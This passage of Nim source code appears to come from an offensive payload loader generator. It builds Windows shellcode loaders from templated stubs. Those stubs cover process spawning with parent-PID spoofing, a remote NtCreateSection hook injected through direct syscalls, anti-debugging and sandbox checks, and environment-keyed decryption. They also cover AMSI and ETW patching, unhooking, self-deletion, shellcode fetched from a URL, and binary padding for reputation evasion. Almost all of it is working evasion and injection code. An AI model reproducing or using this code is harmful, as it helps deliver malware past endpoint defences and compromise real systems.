                GetWindowThreadProcessId(hwnd, cast[LPDWORD](addr(processId)))
                return processId
            # we will for local execution spawn our own process again and inject the hook into it. SO we need the path for our own (the executing) process, which will be tProcPath
            #var hModule: HMODULE = GetModuleHandle(nil)
            #var path: string = newString(1024)
            #GetModuleFileName(hModule, cast[LPWSTR](addr path[0]), 1024)
            
            #let pathString = path[0 .. path.len - 1].cstring()
            var pathString: string = getAppFilename()
            when defined(verbose):
                echo obf("[*] Path to our own process: ") & pathString
            when defined(logFile):
                logVerbose(obf("[*] Path to our own process: ") & pathString)

            when defined(lib_only):
                # we need to spawn our own DLL again, so we need to add rundll32.exe to the pathString but also the first argument from our current rundll32.exe process which should be the dll
                # we also need the full path to the DLL, which means the CWD + the DLL name
                pathString = pathString & " " & getCurrentDir() & "\\" & paramStr(1)
            
            var comandline: string = ""
            var i = 1
            
            while i <= paramCount():
                when defined(lib_only):
                    if (i != 1):
                        # first parameter is rundll32.exe,Funcname (skip that)
                        comandline = comandline & " " & paramStr(i)
                else:
                    comandline = comandline & " " & paramStr(i)
                inc(i)          

            when defined spoof_args:
                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline & obf("{spoofArgs}"))
            else:
                # add random args, so that it wont spawn itself again
                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline)
        else:
            when defined spoof_args:
                tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
            else:
                tProcPath = newWideCString(obf(r"{customspawnprocess}"))

        InitializeProcThreadAttributeList(NULL, 3, 0, addr lpSize)
        si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
        InitializeProcThreadAttributeList(si.lpAttributeList, 3, 0, addr lpSize)

        when defined(blockDLLs) or (obf("{parentProcess}") != ""):

            when defined(blockDLLs):
                const
                    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
                    PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
                var
                    policy: DWORD64
                
                if(cfgspawn):
                    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON or PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF
                else:
                    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                
                status = UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
                    addr policy,
                    sizeof(policy),
                    NULL,
                    NULL)

            if (obf("{parentProcess}") != ""):
                var
                    ppHandle: HANDLE
                    ppid: DWORD

                ppid = FindPidByName(obf("{parentProcess}"))                    
                ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
                
                if (ppHandle == 0):
                    when defined(verbose):
                        echo obf("Failed to open parent process handle, no permissions??")
                    ppHandle = HANDLE(-1) # Current Process

                status = UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                    addr ppHandle,
                    sizeof(ppHandle),
                    NULL,
                    NULL)
        var flags: DWORD = EXTENDED_STARTUPINFO_PRESENT
        
        when defined(suspended): 
            flags = flags or CREATE_SUSPENDED
        
        if(cfgspawn): # for some reasson CFG kicks in, when we execute threadlessinject style into a newly spawned process
            
            var policy: DWORD64
            const PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF = 0x00000002 shl 40
            policy = PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_OFF

        
            status = UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
                addr policy,
                sizeof(policy),
                NULL,
                NULL)
          

        status = CreateProcess(
            NULL,
            cast[LPWSTR](tProcPath),
            ps,
            ts, 
            FALSE,
            flags,
            NULL,
            r"C:\Windows\system32\",
            addr si.StartupInfo,
            addr pi)
        
        tProcess = pi.hProcess
        remoteProcID = pi.dwProcessId
        treadHandle = pi.hThread
        
        when defined(verbose):
            echo obf("[*] CreateProcess: "), status
            if (status == 0):
                echo obf("    \\-- Error: "), GetlastError()

        

    # when defined libonly and more than two argument provided return, we already got spawned again for ruy-lopez and dont want to end up in a loop
    when defined(localinject):
        if(not amISpawned()):
            when defined(verbose):
                echo obf("[*] Spawning process...")
            StartProcess()
        else:
            when defined(verbose):
                echo obf("[*] We are already spawned, continue...")
            
    else:
        StartProcess()

    when defined(ruylopez):

        if (amISpawned() == false):

            var ntdll: LibHandle = loadLib(obf("ntdll"))

            var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
            
            when defined(verbose):
                echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID

            const hookShellcode = slurp"ruylopez.bin"

            var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

            # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes

            var rPtr: LPVOID
            var status: NTSTATUS
            var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
            
            when defined(Syswhispers):
                status = oqiahsjynmxkla(tProcess, &rPtr, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE)
            else:
                when defined(Hellsgate):
                    if getSyscall(ntAllocTable):
                        syscall = ntAllocTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

                status = NtAllocateVirtualMemory(
                    tProcess, &rPtr, 0, &sc_size, 
                    MEM_COMMIT, 
                    PAGE_READWRITE);

            when defined(verbose):
                if(status == 0):
                    echo obf("[+] NtAllocateVirtualMemory success!")
                else:
                    echo obf("[-] NtAllocateVirtualMemory failed!")
                    quit(1)

            when defined(verbose):
                if(rPtr != nil):
                    echo obf("[+] Successfully allocated remote process memory for the shellcode")
                else:
                    echo obf("[-] Memory allocation for remote process failed!")
                    quit(1)

            var buffers: HookTrampolineBuffers

            var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
            ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
            var output: bool = false

            if (ntCreate_Address == 0):
                quit(1)
                
            buffers.previousBytes = cast[HANDLE](ntCreate_Address)
            buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
            g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
            var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
            copyMem(PointerToOrigBytes, addressToHook, 24)
            
            when defined(verbose):
                echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")

            output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)

            when defined(verbose):
                if(output):
                    echo obf("[+] Remotely Hooked NtCreateSection: "), output
                else:
                    echo obf("[-] Remote Hook failed!")
                    quit(1)


            # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
            # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
            when defined(verbose):
                echo obf("[*] Searching for egg in the shellcode...")

            var eggIndex = 0
            for i in 0 ..< hookShellcodeBytes.len:
                if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
                    when defined(verbose):
                        echo obf("[+] Found egg at index: "), i
                    eggIndex = i
                    break

            # Write the original bytes into the egg
            when defined(verbose):
                echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
            when defined(verbose):
                echo obf("[*] Done.")

            # Finally write the shellcode into the remote process
            var bytesWritten: SIZE_T
            
            when defined(Syswhispers):
                status = oqiazasusjk(tProcess, rPtr, unsafeAddr hookShellcodeBytes[0], sc_size-1, addr bytesWritten)
            else:
                when defined(Hellsgate):
                    if getSyscall(ntWriteTable):
                        syscall = ntWriteTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                status = NtWriteVirtualMemory(
                        tProcess, 
                        rPtr, 
                        unsafeAddr hookShellcodeBytes[0], 
                        sc_size-1, 
                        addr bytesWritten);

            when defined(verbose):
                if (status == 0):
                    echo obf("[+] NtWriteVirtualMemory: "), status
                    echo obf("    \\-- bytes written: "), bytesWritten
                    echo ""
                else:
                    echo obf("[-] NtWriteVirtualMemory failed!")
                    quit(1)
            
            # re-protect memory to RX
            
            var protectRXAddress: LPVOID = rPtr
            var rxOldProtect: DWORD = 0
            when defined(Syswhispers):
                status = uashdiasdj(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)
            else:                
                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                status = NtProtectVirtualMemory(tProcess,unsafeAddr protectRXAddress,addr sc_size,PAGE_EXECUTE_READ,addr rxOldProtect)

            if(status == 0):
                when defined(verbose):
                    echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
            else:
                when defined(verbose):
                    echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
                quit(1)
    when defined(ruylopez):
        when defined(localinject):
            if(not amISpawned()):
                # resume main thread for execution
                ResumeThread(treadHandle)
                # Wait for the thread to finish
                when not defined(mutexoneshot):
                    WaitForSingleObject(treadHandle, INFINITE)
                when defined(verbose):
                    echo obf("[*] Quit main process...")
                quit(1)


    when defined(verbose):
        echo obf("[*] Sleeping in between for: "), {sleepinbetween}

    when defined(sleepinbetween):
        HowMuchTimeWouldYouLikeToSleep({sleepinbetween})

    when defined(verbose):
        echo obf("[*] Target Process: "), remoteProcID


"""


let conhostinjectenumstubs * = """

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc getParentPID(): DWORD =
    var hwnd = GetForegroundWindow()
    var processId: DWORD = 0
    GetWindowThreadProcessId(hwnd, cast[LPDWORD](addr(processId)))
    return processId

proc getConHostID(dwPPid: DWORD):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                if ($(entry.szExeFile).join()).contains(obf("conhost.exe")):
                    if entry.th32ParentProcessID == dwPPid:
                        result = entry.th32ProcessID
                while Process32NextA(snapshot,addr entry):
                    if ($(entry.szExeFile).join()).contains(obf("conhost.exe")):
                        if entry.th32ParentProcessID == dwPPid:
                            result = entry.th32ProcessID
                            break
    except:
        when defined(verbose):
            echo obf("[-] Process ID not found")
        

type
  ConsoleWindow* = object
    EnableBothScrollBars: uint64
    UpdateScrollBar: uint64
    IsInFullscreen: uint64
    SetIsFullscreen: uint64
    SetViewportOrigin: uint64
    SetWindowHasMoved: uint64
    CaptureMouse: uint64
    ReleaseMouse: uint64
    GetWindowHandle: uint64
    SetOwner: uint64
    GetCursorPosition: uint64
    GetClientRectangle: uint64
    MapPoints: uint64
    ConvertScreenToClient: uint64
    SendNotifyBeep: uint64
    PostUpdateScrollBars: uint64
    PostUpdateTitleWithCopy: uint64
    PostUpdateWindowSize: uint64
    UpdateWindowSize: uint64
    UpdateWindowText: uint64
    HorizontalScroll: uint64
    VerticalScroll: uint64
    SignalUia: uint64
    UiaSetTextAreaFocus: uint64
    GetWindowRect: uint64

var hwnd: HWND

proc EnumWindowsProc(enumhwnd: HWND, lParam: LPARAM): BOOL {.stdcall.} =
  var className: array[32, WCHAR]
  var pid,ppid: DWORD
  if GetClassNameW(enumhwnd, cast[LPWSTR](addr className[0]), (int32)className.len) > 0:
    if toString(className) == "ConsoleWindowClass":
        when defined(verbose):
            echo "[+] Found a console window with HWND: ", enumhwnd
        hwnd = enumhwnd
        GetWindowThreadProcessId(hwnd, addr ppid)
        # We prefer to inject into a process, that is not the parent of the current process, e.G. cmd for a binary
        if ppid != getParentPID():
            return false
        else:
            when defined(verbose):
                echo "[*] We prefer to not inject into our parent process such as cmd. If no other candidate if found, we will still do it\n"
            return true
    return true


"""


let  MainStub * = """

when not defined(DInvoke):
    when defined(unhook):
        from winim import GetModuleInformation,MODULEINFO,LPMODULEINFO

proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
    when defined(execute_in_proc):
        if execute_in():
            return 0

    when defined(mutexoneshot):
        Sleep(2000)
        var dontcontinue: BOOL = FALSE
        var temp: array[MAX_PATH, char]
        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
            let mutexName = &"Global\\REPLACEMUTEX"
            var lastError: DWORD
            let mutex = CreateMutexA(nil, TRUE, mutexName)
            lastError = GetLastError()
            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                dontcontinue = FALSE
            else:
                dontcontinue = TRUE
        if(dontcontinue):
            quit(1)

"""

let BeingDebugged * = fmt"""
if(AmIDebugged()):
  quit()
else:
    if(isHeapGrowable()):
        when defined(verbose):
            echo obf("[*] We don't appear to be Debugged, continuing...")
        if(CheckHardwareBreakPoints()):
            when defined(verbose):
                echo obf("[*] No hardwareBreakpoints detected...")
            if(CreatedInterrupt()):
                when defined(verbose):
                    echo obf("[*] No strange interrupts detected...")
                when defined(SkipDefaultSandBoxChecks):
                    when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
                        envkey2 = envkey & "{lastFour}"
                else:
                    when not defined(customKey):    
                        envkey2 = envkey & "{fourthtosecondlast}"
            else:
                when defined(verbose):
                    echo obf("[*] Strange Interrupt Detected, quit.")
                envkey2 = obf("aetschibaetsch")
    else:
        quit(1)

"""

let CheckHardwareBreakPoints * = fmt"""

proc CheckHardwareBreakPoints(): bool =
    var
        ctx: CONTEXT
        hThread: HANDLE
        hwbp: DWORD
        i: int
        status: bool = false

    hThread = GetCurrentThread()
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
    status = GetThreadContext(hThread, addr ctx)

    if (status):
        hwbp = DWORD(ctx.Dr0) or DWORD(ctx.Dr1) or DWORD(ctx.Dr2) or DWORD(ctx.Dr3)
        if (hwbp != 0):
            when defined(verbose):
                echo obf("\r\n[*] Hardware Breakpoint Detected, quit.\r\n")
            status = false
        else:
            status = true
            when defined(verbose):
                echo obf("\r\n[*] No Hardware Breakpoints Detected, continuing...\r\n")
    else:
        status = false
        envkey2 = obf("aetschibaetsch")

    result = status

"""

let CreatedInterruptStub * = """

proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG {.stdcall.}=
    #  process all exceptions, including EXCEPTION_ILLEGAL_INSTRUCTION
    result = EXCEPTION_CONTINUE_EXECUTION

proc CreatedInterrupt(): bool =
    when not defined(csharp):
        when defined(verbose):
            echo obf("[*] Adding Exception Handler...")
        AddVectoredExceptionHandler(1, VEHHandler)
        when defined(verbose):
            echo obf("[*] Raising exception...")
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
        when defined(verbose):
            echo obf("[*] Removing ExceptionHandler...")
        RemoveVectoredExceptionHandler(VEHHandler)
        return true
    else:
        when defined(verbose):
            echo obf("[*] Exception Handler Check disabled for loading csharp assemblies or PEs as its causing problems...")
        return true
"""

let DomainKeyStub * = """

envkey = getDomain()
envkey2 = envkey.toLower() # lowercase to avoid issues with case sensitivity
when defined(verbose):
    echo obf("[*] Domain for the key: "), envkey2


"""

let UsernameKeyStub * = """

when defined(environmentalDomain):
    # concatenate the Username to existing envkey2 value as we enumerate both
    envkey = envkey & getUsername()
    envkey2 = envkey
else:
    envkey = getUsername()
    envkey2 = envkey

envkey = envkey.toLower() # lowercase to avoid issues with case sensitivity

when defined(verbose):
    echo obf("[*] Final Key: "), envkey2
"""


var stub = Cryptstub1
if(macPayload):
    stub.add(macPayloadStub)
stub.add(Cryptstub15)

if (usepoolparty):
    stub.add(PoolpartyTypeDefs)

if (not noDInvoke):
    stub.add(DInvokeStubfirst)
    stub.add(DInvokeGetPEB)
    stub.add(DInvokeStubSecond)
    stub.add(DInvokeStubThird)
    stub.add(DInvokeStubFourth)
    stub.add(DInvokeBaseStub)

if (getfreshstub):
    stub.add(GetSyscallStub)

if(pump):
    # makes no sense to import nimstrenc when strings should be visible in the binary.
    stub =  stub.replace("    import nimstrenc", "")
    stub = stub.replace("when not defined(proxy):","")
    stub = stub.replace("    when defined(notcloned):","")
    for m in pumpargs:
        if(m == "words"):
            echo "[*] Adding words"
            stub.add(genEnglishwords(rand(4750..7800)))
        if (m == "reputation"):
            echo "[*] Adding reputation"
            stub.add(genTrustedwords(rand(3500..6200)))

if(killdate != ""):
    var killdateStubnew = killdateStub.replace("KILLDATEREPLACE", killdate)
    stub.add(killdateStubnew)


if(antidebug):
    stub.add(AntiDebugPEBStub)
    stub.add(IsDebuggerPresentStub)
    stub.add(CheckHardwareBreakPoints)
    stub.add(CreatedInterruptStub)
    stub.add(BeingDebugged)

stub.add(getRandStubNoTab())

if(sandbox):
    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
    if(environmentalDomain):
        stub.add(DomainCheckStub)
    for m in sandboxchecks:
        if(m == "Domain"):
            if (not environmentalDomain): # if we already added it, we don't want to add it again
                stub.add(DomainCheckStub)
            stub.add(DomainCheckStub1)
        if (m == "DiskSpace"):
            stub.add(DiskSpaceStub)
        if (m == "DomainJoined"):
            stub.add(DomainJoinStub)
        if (m == "MemorySpace"):
            stub.add(MemorySpaceStub)
        if (m == "Emulated"):
            stub.add(VirtualAlloxExNumaCheckStub)
        if (m == "WindowChanges"):
            stub.add(WindowChangeStub)
else:
    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
    if(environmentalDomain):
        stub.add(DomainCheckStub)
    if(environmentalUsername):
        stub.add(UserNameCheckStub)

if (apihide):
    stub.add(APIHideStub)

if(defaultSandBoxChecks):
    stub.add(Accelerated_sleepStub)
if(not noAntiEmulate):
    stub.add(AntiEmulateStub)

if(gosleep or remoteETWpatch or remoteAMSIpatch):
    stub.add(SleepStubFirst)
    if (gosleep):
        stub.add(SleepStubSecond)

stub.add(getRandStubNoTab())


if(environmentalDomain):
    stub.add(DomainKeyStub)
if(environmentalUsername):
    stub.add(UsernameKeyStub)

if (ETWEATHook):
    stub.add(EATHookStub)

if (syswhispers):
    if(jump):
        if (not compileX86):
            stub.add(WhispersJumpStub)
        else:
            stub.add(WhispersJumpStubX86)
    else:
        if (not compileX86):
            stub.add(WhispersStub)
        else:
            stub.add(WhispersStubX86)

if(hellsgate):
    stub.add(HellsgateStub)
    stub.add(HellsgateAllocDelegate)
    stub.add(HellsgateProtectDelegate)
    stub.add(HellsgateWriteDelegate)
    stub.add(HellsgateNtCloseDelegate)
    stub.add(HellsgateNtReadVirtualMemoryDelegate)
    stub.add(HellsgateNtFreeVirtualMemoryDelegate)
    # if use poolparty add hellsgate poolparty stubs
    if (usepoolparty):
        stub.add(HellsgateZwAssociateWaitCompletionPacketDelegate)
        stub.add(HellsgateNtSetInformationWorkerFactoryDelegate)
        stub.add(HellsgateZwSetIoCompletionDelegate)
    if(remoteMapSection):
        stub.add(HellsgateNtMapViewOfSectionDelegate)
        stub.add(HellsgateNtCreateSectionDelegate)
    if (peload and (not localinject)):
        stub.add(HellsgateNtCreateThreadExDelegate)
    elif(localCreateThread or remoteETWpatch or remoteAMSIpatch):
        stub.add(HellsgateNtCreateThreadExDelegate)
    if(not localinject or remoteETWpatch or remoteAMSIpatch):
        stub.add(HellsgateNtOpenProcessDelegate)
        stub.add(HellsgateNtDuplicateObjectDelegate)
        stub.add(HellsgateNtCreateThreadExDelegate)
    if(localinject and useQueueAPC):
        stub.add(HellsgateNtTestAlertDelegate)
    if(useQueueAPC):
        stub.add(HellsgateNtQueueApcThreadDelegate)

if (AMSICreateSectionHook):
    stub.add(AmsiNtCreateSectionDecryptStub)
    stub.add(AMSINtCreateSectionHookStubFirst)

if(AMSI or ETW):
    stub.add(HardwareBreakpointStub)
    if(AMSI):
        stub.add(AMSIExceptionHandlerStub)
    if(ETW):
        stub.add(ETWExceptionHandlerStub)

if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
    if (not noDInvoke):
        stub.add(DInvokeLoadLibraryAGetProcAddress)
        if (selfdelete):
            stub.add(DInvokeSelfDeleteStubs)

if (remoteETWpatch or remoteAMSIpatch or jmpEntry):
    stub.add(RemoteModuleHandleStub)
    #if (unhook == false):
    #    if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)

if(jmpEntry):
    stub.add(CustomThreadEntryStubFirst)

if(dripallocate):
    stub.add(DripAllocateStubFirst)

if(threadless):
    stub.add(ThreadlessInjectStub)

if(conhostinject):
    stub.add(conhostinjectenumstubs)

if(execute_in_proc):
    var tempStub = ExecuteInStub.replace("EXENAME", execute_in)
    stub.add(tempStub)

if (not mutexoneshot):
    stub.add(MainStub)
else:
    var mutexname = rndStr(8)
    var newMainStub = MainStub.replace("REPLACEMUTEX", mutexname)
    stub.add(newMainStub)

stub.add(getRandStub())


if(getfreshstub):
    stub.add(RetrieveSyscallStubs)

# if ruy-lopez and localinject or csharp/peload add NotepadProcIDStub
if(ruylopez and (localinject or csharp or peload) and (not conhostinject)):
    stub.add(NotepadProcIDStub)

if(unhook):
    if(hellsgate):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    elif(getfreshstub):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    elif(syswhispers):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    stub.add(UnhookStub)

stub.add(getRandStub())

if (retrieveFromFile):
    stub.add(ShellcodefromFileStub)
elif (retrieveFromURL):
    stub.add(ShellcodefromURLStub)

# if remoteinject and remotepatchamsi or threadlessinject
if (remoteinject and (remoteAMSIpatch or stomb)):
    stub.add(RemoteLoadDllStub)

# Only decrypt when sandbox Checks/Unhooking/Sleep is done
stub.add(getRandStub())
stub.add(Cryptstub2)
stub.add(getRandStub())
stub.add(getRandStub())
stub.add(Cryptstub3)
stub.add(getRandStub())
stub.add(getRandStub())

if(jmpEntry):
    stub.add(CustomThreadEntryStubSecond)

if(dripallocate):
    stub.add(DripAllocateStubSecond)

if (selfdelete):
    stub.add(FileDeleteStub)
stub.add(getRandStub())

# if poolparty add PoolpartyExecute
if (usepoolparty):
    stub.add(PoolpartyExecute)

if (localinject):
    if(AMSI):
        stub.add(AMSIStub)
    elif(AMSIPatch):
        stub.add(AMSIPatchStub)
    elif(ClrPatch):
        stub.add(ClrPatchStub)
    elif(AmsiProviderPatch):
        stub.add(AMSIProviderPatchStub)
    elif(AMSICreateSectionHook):
        stub.add(AMSINtCreateSectionHookStub)
    if(ETWPatch):
        stub.add(ETWPatchStub)
    if (COMVARETW):
        stub.add(ETWCOMVARStub)
    if (ETW):
        stub.add(ETWStub)
stub.add(getRandStub())
stub.add(getRandStub())
if (peload):
    if (localinject):
        if (embeddedArguments):
            stub.add(PatchargsFuncs)
        if (hellsgate):
            stub.add(PELoadStub)
        elif(getfreshstub):
            stub.add(PELoadStub)
        elif(syswhispers):
            stub.add(PELoadStub)
        stub.add(getRandStub())
    else:   
        if (hellsgate):
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
            if (remoteMapSection):
                stub.add(ShellcodeRemoteInjectMapSection)
            else:
                stub.add(ShellcoderemoteinjectStub)

if (shellcode):
    if (localinject):
        stub.add(getRandStub())
        stub.add(LocalInjectStub)
    else:
        stub.add(getRandStub())
        if (hellsgate):
            if (processname == ""):
                if (not conhostinject):
                    stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif(syswhispers):
            if (processname == ""):
                stub.add(getRandStub())
                if (not conhostinject):
                    stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif (getfreshstub):
            stub.add(getRandStub())
            if (processname == ""):
                if (not conhostinject):
                    stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(getRandStub())
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        if (remoteMapSection):
            stub.add(ShellcodeRemoteInjectMapSection)
        else:
            stub.add(ShellcoderemoteinjectStub)

if(dll_out or cpl or xll):
    if ((hide == false) and (apiHide == false)):
        stub.add(DLLNoHideStub)

if (csharp and not peinject):
    stub.add(getRandStub())
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubNoArgs)
        stub.add(getRandStub())
    else:
        stub.add(getRandStub())
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubArgs)

if (pump):
    for m in pumpargs:
        if(m == "words"):
            stub.add(genEnglishwords(rand(4750..7800)))

if (sleepycrypt):
    stub.add(LocalInjectGetSyscallStubSleepStub)
    #stub.add(SleepyCryptLoopExecute)

if(dll_out or cpl or xll):
    if (dllProxy):
        var newDllProxyStub = DLLProxyStub
        if(mutexoneshot):
            # replace with random mutex name
            var mutexname = rndStr(8)
            newDllProxyStub = newDllProxyStub.replace("REPLACEMUTEX", mutexname)
        if(execute_in_proc):
            newDllProxyStub = newDllProxyStub.replace("EXENAME", execute_in)
            stub.add(newDllProxyStub)
        else:
            stub.add(newDllProxyStub)
        # if custom payload function not empty, add DllCustomPayloadFuncStub
        if (payloadFunction != ""):
            var NewDllCustomPayloadFuncStub = DllCustomPayloadFuncStub.replace("{payloadFunction}", payloadFunction)
            if(mutexoneshot):
                # replace with random mutex name
                var mutexname = rndStr(8)
